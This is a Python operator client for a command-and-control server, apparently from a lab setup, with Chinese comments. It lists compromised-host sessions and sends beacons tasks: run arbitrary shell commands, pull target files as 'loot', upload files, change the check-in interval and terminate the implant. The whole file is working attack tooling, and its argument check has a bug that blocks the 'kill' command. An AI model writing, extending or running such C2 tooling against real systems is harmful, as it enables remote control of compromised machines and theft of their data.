#!/usr/bin/env python3
"""lab-c2/tools/c2ctl.py - 无头控制 C2 (走本地控制 API)

用法:
  python tools/c2ctl.py sessions                 列出会话
  python tools/c2ctl.py exec  <sid|idx> <命令>   下发 shell 任务
  python tools/c2ctl.py dl    <sid|idx> <路径>   下载目标文件(服务端存 loot_*.bin)
  python tools/c2ctl.py ul    <sid|idx> <本地> <远程>
  python tools/c2ctl.py sleep <sid|idx> <秒>     改心跳间隔
  python tools/c2ctl.py kill  <sid|idx>          结束信标
  python tools/c2ctl.py results [n] [sid|idx]    取最近 n 条结果(默认 10)

环境变量: LCS_C2(默认 http://127.0.0.1:8080) / LCS_CTL_TOKEN(默认 lcslab)
"""
import base64
import json
import os
import sys
import urllib.request

BASE = os.environ.get("LCS_C2", "http://127.0.0.1:8080")
TOKEN = os.environ.get("LCS_CTL_TOKEN", "lcslab")
KIND = {"exec": "shell", "dl": "download", "ul": "upload", "sleep": "sleep", "kill": "exit"}


def ctl(**kw):
    kw["token"] = TOKEN
    req = urllib.request.Request(BASE + "/api/v1/ctl",
                                 data=json.dumps(kw).encode(),
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read().decode())


def main() -> int:
    a = sys.argv[1:]

    if not a or a[0] == "sessions":
        r = ctl(op="sessions")
        if not r["sessions"]:
            print("(无会话)")
        live = 0
        for s in r["sessions"]:
            if s.get("alive"):
                live += 1
            print(f"[{s['idx']}] {s['sid'][:8]} {s['user']}@{s['host']} pid={s['pid']} "
                  f"ip={s['ip']} {s['arch']} 在线={'是' if s.get('alive') else '否'}"
                  f"(心跳{s.get('age')}s前) 队列={s['queued']} 结果={s['results']} pwd={s['pwd']}")
        # ASCII 标记行: 自动化脚本只匹配这一行, 避免脚本里出现中文被 ANSI 解码搞坏引号
        print(f"LIVE_SESSIONS={live}")
        return 0

    if a[0] == "results":
        n = int(a[1]) if len(a) > 1 else 10
        sid = a[2] if len(a) > 2 else ""
        r = ctl(op="results", n=n, sid=sid)
        if not r["results"]:
            print("(无结果)")
        for x in r["results"]:
            print(f"--- task={x.get('task')} {x.get('type')} {x.get('a', '')}")
            print((x.get("out", "") or "").rstrip())
        return 0

    if a[0] in KIND:
        if len(a) < 3 and a[0] != "results":
            print(__doc__)
            return 1
        sid, rest = a[1], a[2:]
        t = KIND[a[0]]
        if a[0] == "ul":
            blob = base64.b64encode(open(rest[0], "rb").read()).decode()
            r = ctl(op="push", sid=sid, type=t, a=blob, b=rest[1])
        else:
            r = ctl(op="push", sid=sid, type=t, a=" ".join(rest))
        print(json.dumps(r, ensure_ascii=False))
        return 0

    print(__doc__)
    return 1


if __name__ == "__main__":
    sys.exit(main())
